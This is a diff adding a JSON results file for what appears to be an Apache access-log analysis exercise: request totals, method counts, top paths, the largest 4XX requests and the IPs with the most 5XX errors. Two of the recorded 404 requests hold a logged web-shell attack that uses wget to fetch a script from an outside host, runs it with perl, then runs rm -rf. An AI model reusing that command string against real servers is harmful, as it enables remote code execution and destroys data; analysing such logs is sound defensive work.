@@ -1,0 +1,36 @@
+{
+     "task1 (total requests)": 225133,
+     "task2 (total requests by method)": {
+          "GET": 122095,
+          "POST": 102503,
+          "HEAD": 528,
+          "PUT": 6,
+          "IRRELEVANT": 1
+     },
+     "task3 (top 10 most frequent requests)": {
+          "/administrator/index.php": 103932,
+          "/apache-log/access.log": 26336,
+          "/": 6940,
+          "/templates/_system/css/general.css": 4980,
+          "/robots.txt": 3199,
+          "http://almhuette-raith.at/administrator/index.php": 2356,
+          "/favicon.ico": 2201,
+          "/wp-login.php": 1644,
+          "/administrator/": 1563,
+          "/templates/jp_hotel/css/template.css": 1287
+     },
+     "task4 (top 5 largest 4XX requests)": {
+          "164.132.159.94 /index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwjLqNrK_8TNAhWTSxoKHYuUCm84rAIQFgi9AzBP&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/index.inc.php 404": "442",
+          "164.132.159.94 /index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwjLqNrK_8TNAhWTSxoKHYuUCm84rAIQFgi9AzBP&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/index.inc.php?shxxx=wget%20http://www.fia.com.gr/wp-content/uploads/2010/doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20rm%20-rf%20doc.* 404": "442",
+          "164.132.159.94 /index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwi42O_M_8TNAhWFXhoKHYc8DE043gIQFgi1ATAd&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/index.inc.php 404": "442",
+          "164.132.159.94 /index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwi42O_M_8TNAhWFXhoKHYc8DE043gIQFgi1ATAd&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/index.inc.php?shxxx=wget%20http://www.fia.com.gr/wp-content/uploads/2010/doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20perl%20doc.txt%20;%20rm%20-rf%20doc.* 404": "442",
+          "164.132.159.94 /index.php%3Foption%3Dcom_content%26view%3Darticle%26id%3D50%26Itemid%3D56&amp;sa=U&amp;ved=0ahUKEwjLqNrK_8TNAhWTSxoKHYuUCm84rAIQFgi9AzBP&amp;usg=AFQjCNESXAyEBT2Tm9HSkP0-zDYPtMGW1Q/images/com_adsmanager/ads/uploaded/petx.php 404": "437"
+     },
+     "task5 (top 5 users by number of requests that ended 5XX": {
+          "189.217.45.73": 225,
+          "82.193.127.15": 4,
+          "91.210.145.36": 3,
+          "194.87.237.6": 2,
+          "198.38.94.207": 2
+     }
+}
